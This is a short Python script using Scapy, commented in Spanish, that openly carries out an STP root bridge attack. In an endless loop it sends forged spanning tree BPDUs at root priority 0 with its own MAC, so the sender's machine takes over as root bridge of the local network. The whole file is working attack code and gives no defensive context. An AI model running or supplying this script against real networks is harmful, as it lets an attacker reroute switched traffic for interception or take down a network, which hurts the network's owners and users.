#!/usr/bin/env python3
from scapy.all import *
import time

# === CONFIGURACIÓN ===
iface = "ens3" 
# Obtenemos nuestra propia MAC para usarla en el paquete
my_mac = get_if_hwaddr(iface)

print(f"[+] Iniciando ataque STP Root Bridge en {iface}...")
print(f"[+] Mi MAC atacante: {my_mac}")

try:
    while True:
        # Construimos la trama STP (Spanning Tree Protocol)
        # - LLC: Capa de enlace lógico necesaria para STP
        # - STP: Payload del protocolo
        pkt = Ether(dst="01:80:c2:00:00:00", src=my_mac) / \
              LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
              STP(bpdutype=0x00,      # Tipo Configuración
                  bpduflags=0x00, 
                  rootid=0,           # <--- PRIORIDAD 0 (La mejor posible)
                  rootmac=my_mac,     # Decimos que NOSOTROS somos el Root
                  pathcost=0,         # Costo 0 para llegar al Root (porque somos nosotros)
                  bridgeid=0,         # Prioridad de nuestro puente (0)
                  bridgemac=my_mac,   # Nuestra MAC
                  portid=0x8001)      # Prioridad de puerto estándar

        # Enviamos el paquete malicioso
        sendp(pkt, iface=iface, verbose=False)
        print(f"\r[+] Enviando BPDU: ¡Soy el Root Bridge! (Prio: 0)", end="")
        
        # El estándar STP envía paquetes "Hello" cada 2 segundos
        time.sleep(2)

except KeyboardInterrupt:
    print("\n\n[!] Ataque detenido.")